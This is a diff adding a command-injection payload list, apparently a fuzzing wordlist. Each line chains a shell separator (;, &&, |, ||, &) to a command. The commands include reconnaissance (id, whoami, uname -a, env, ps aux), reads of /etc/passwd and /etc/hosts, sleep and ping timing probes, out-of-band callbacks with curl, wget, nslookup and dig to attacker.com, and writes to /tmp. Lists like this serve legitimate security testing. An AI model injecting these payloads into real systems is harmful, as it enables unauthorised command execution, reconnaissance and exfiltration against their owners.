@@ -1,0 +1,120 @@
+;id
+&&id
+|id
+||id
+&id
+;whoami
+&&whoami
+|whoami
+;sleep 5
+&&sleep 5
+
+;id
+;whoami
+;uname -a
+;cat /etc/passwd
+;ls
+;pwd
+;hostname
+;ps aux
+;env
+;uptime
+
+&&id
+&&whoami
+&&uname -a
+&&cat /etc/passwd
+&&ls
+&&pwd
+&&hostname
+&&ps aux
+&&env
+&&uptime
+
+|id
+|whoami
+|uname -a
+|cat /etc/passwd
+|ls
+|pwd
+|hostname
+|ps aux
+|env
+|uptime
+
+||id
+||whoami
+||uname -a
+||cat /etc/passwd
+||ls
+||pwd
+||hostname
+||ps aux
+||env
+||uptime
+
+&id
+&whoami
+&uname -a
+&cat /etc/passwd
+&ls
+&pwd
+&hostname
+&ps aux
+&env
+&uptime
+
+; sleep 5
+&& sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+
+;ping -c 3 127.0.0.1
+&&ping -c 3 127.0.0.1
+|ping -c 3 127.0.0.1
+||ping -c 3 127.0.0.1
+&ping -c 3 127.0.0.1
+
+;curl http://attacker.com
+&&curl http://attacker.com
+|curl http://attacker.com
+||curl http://attacker.com
+
+;wget http://attacker.com
+&&wget http://attacker.com
+|wget http://attacker.com
+||wget http://attacker.com
+
+;nslookup attacker.com
+&&nslookup attacker.com
+|nslookup attacker.com
+||nslookup attacker.com
+
+;dig attacker.com
+&&dig attacker.com
+|dig attacker.com
+
+;cat /etc/hosts
+&&cat /etc/hosts
+|cat /etc/hosts
+
+;cat /proc/version
+&&cat /proc/version
+|cat /proc/version
+
+;ls -la
+&&ls -la
+|ls -la
+
+;echo test
+&&echo test
+|echo test
+
+;touch /tmp/pwned
+&&touch /tmp/pwned
+|touch /tmp/pwned
+
+;id > /tmp/id.txt
+&&id > /tmp/id.txt
+|id > /tmp/id.txt
